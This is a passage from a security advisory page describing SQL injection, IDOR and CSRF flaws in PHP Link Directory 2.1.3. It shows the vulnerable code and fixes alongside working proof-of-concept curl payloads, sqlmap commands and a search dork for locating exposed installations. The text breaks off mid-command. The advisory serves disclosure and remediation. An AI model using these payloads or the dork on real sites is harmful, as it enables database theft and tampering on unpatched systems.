---
title: PHP Link Directory (phpLD) 2.1.3 - SQL Injection, IDOR, CSRF
url: https://cxsecurity.com/issue/WLB-2026060010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:39.574745
---

# PHP Link Directory (phpLD) 2.1.3 - SQL Injection, IDOR, CSRF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PHP Link Directory (phpLD) 2.1.3 - SQL Injection, IDOR, CSRF** **2026.06.15**  Credit:  **[Xasthur](https://cxsecurity.com/author/Xasthur/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** "PHP Link Directory" inurl:submit.php OR intitle:"phpLinkDirectory" OR inurl:add\_reciprocal.php](https://cxsecurity.com/dorks/)** | |

Title: PHP Link Directory (phpLD) 2.1.x Multiple Vulnerabilities
Product: PHP Link Directory (phpLD)
Vendor: NetCreated, Inc. / phplinkdirectory.com (EOL)
Version: 2.1.3 (also affects 2.1.x branch; tested on 2.1.3)
Type: SQL Injection, IDOR, CSRF, Information Disclosure
Risk: High (authenticated SQLi) / Medium (unauthenticated IDOR)
Discovered: 2026-06-14
Advisory: PHPLD-2026-001
================================================================================
SUMMARY
================================================================================
PHP Link Directory 2.1.3 contains several security issues:
[1] SQL Injection in admin/dir\_validate.php (POST CATEGORY\_ID)
[2] SQL Injection in admin panel via ORDER BY (GET sort -> session)
[3] Insecure Direct Object Reference in add\_reciprocal.php (no auth)
[4] CSRF on admin state-changing GET actions (dir\_links\_edit.php)
[5] Exposed install/ directory after deployment (configuration risk)
Public-facing search (index.php?q=) and submit.php CAPTCHA are NOT SQL
injectable in default code (parameters are escaped). Do not report those
as SQLi without a separate bypass.
================================================================================
TEST ENVIRONMENT (local PoC only)
================================================================================
Software : phpLD 2.1.3
PHP : 5.x / 7.x (legacy code)
DBMS : MySQL / MariaDB
URL : http://127.0.0.1/phpld/ <-- change to your local path
Prerequisites:
- Completed /install/ setup
- At least one admin user
- At least one active link (STATUS=2) for IDOR test
- At least one link in a category for dir\_validate test
================================================================================
[1] SQL INJECTION - admin/dir\_validate.php (CATEGORY\_ID)
================================================================================
File : admin/dir\_validate.php (line ~122)
Auth : Required (admin or editor session)
Method : POST
Param : CATEGORY\_ID
Vulnerable code:
if ($\_REQUEST['CATEGORY\_ID'] > 0) {
$where = " WHERE CATEGORY\_ID = '".$\_REQUEST['CATEGORY\_ID']."'";
}
$rs = $db->Execute("SELECT ... FROM PLD\_LINK {$where}");
CATEGORY\_ID is concatenated into SQL without escaping.
--- PoC: Time-based blind (manual curl) ---
Step 1 - Authenticate and save session cookie:
curl -c cookies.txt -X POST \
"http://127.0.0.1/phpld/admin/login.php" \
-d "user=admin&pass=admin&submit=Login" -L
Step 2 - Trigger SLEEP (expect ~5 second delay):
curl -b cookies.txt -X POST \
"http://127.0.0.1/phpld/admin/dir\_validate.php" \
-d "submit=Start&VALIDATE\_LINKS=1&VALIDATE\_RECPR=0&CATEGORY\_ID=1'+AND+SLEEP(5)--+-"
Step 3 - Boolean comparison (all links vs none):
CATEGORY\_ID=1' OR '1'='1
CATEGORY\_ID=1' AND '1'='2
--- PoC: sqlmap ---
sqlmap -u "http://127.0.0.1/phpld/admin/dir\_validate.php" \
--auth-url="http://127.0.0.1/phpld/admin/login.php" \
--auth-data="user=admin&pass=admin&submit=Login" \
--auth-type=POST \
--data="submit=Start&VALIDATE\_LINKS=1&VALIDATE\_RECPR=0&CATEGORY\_ID=1" \
-p CATEGORY\_ID \
--dbms=mysql --prefix="1'" --suffix="-- -" \
--batch --random-agent --time-sec=5
Impact: Full database read/write as DB user (admin credentials dump,
link/category tampering).
Fix: Use $db->qstr($\_REQUEST['CATEGORY\_ID']) or intval() whitelist.
================================================================================
[2] SQL INJECTION - admin ORDER BY (sort parameter)
================================================================================
File : admin/init.php (line ~216), used by multiple admin/\*.php
Auth : Required
Method : GET (stored in session, injected on next page load)
Param : sort
Vulnerable flow:
$\_SESSION['sort'][SCRIPT\_NAME]['field'] = $\_REQUEST['sort'];
...
$orderBy = ' ORDER BY '. SORT\_FIELD.' '.SORT\_ORDER;
Affected examples:
admin/conf\_users.php
admin/conf\_payment.php
admin/email\_message.php
admin/email\_sent\_view.php
--- PoC: Two-step ORDER BY time-based (MySQL) ---
Step 1 - Login (see above), save cookies.txt
Step 2 - Poison session via sort parameter:
curl -b cookies.txt \
"http://127.0.0.1/phpld/admin/conf\_users.php?sort=LOGIN,(SELECT+\*+FROM+(SELECT+SLEEP(5))a)"
Step 3 - Load page to execute ORDER BY:
curl -b cookies.txt \
"http://127.0.0.1/phpld/admin/conf\_users.php"
(Expect ~5s response on step 3 if injectable.)
--- PoC: sqlmap (may require session handling) ---
curl -b cookies.txt \
"http://127.0.0.1/phpld/admin/conf\_users.php?sort=LOGIN"
sqlmap -u "http://127.0.0.1/phpld/admin/conf\_users.php" \
--load-cookies=cookies.txt \
-p sort --technique=T --dbms=mysql --batch
Fix: Whitelist allowed column names before storing in session.
================================================================================
[3] IDOR - add\_reciprocal.php (unauthenticated link update)
================================================================================
File : add\_reciprocal.php (line ~71-94)
Auth : NOT required
Method : GET + POST
Param : id, RECPR\_URL
Any user who knows/guesses a valid link ID with empty RECPR\_URL can update
that link record without proving ownership.
Vulnerable code:
if ($data = $db->GetRow("SELECT \* FROM PLD\_LINK WHERE ID = ".$db->qstr($id)))
{
$data['RECPR\_URL'] = $\_REQUEST['RECPR\_URL'];
...
$db->Replace($tables['link']['name'], $data, 'ID', true);
}
--- PoC: Unauthenticated reciprocal link overwrite ---
Replace LINK\_ID with an existing link ID where RECPR\_URL IS NULL.
# Verify form is shown (link exists, recpr empty):
curl -s "http://127.0.0.1/phpld/add\_reciprocal.php?id=LINK\_ID" | \
grep -i "Reciprocal Link URL"
# Overwrite reciprocal URL (no cookie, no login):
curl -X POST "http://127.0...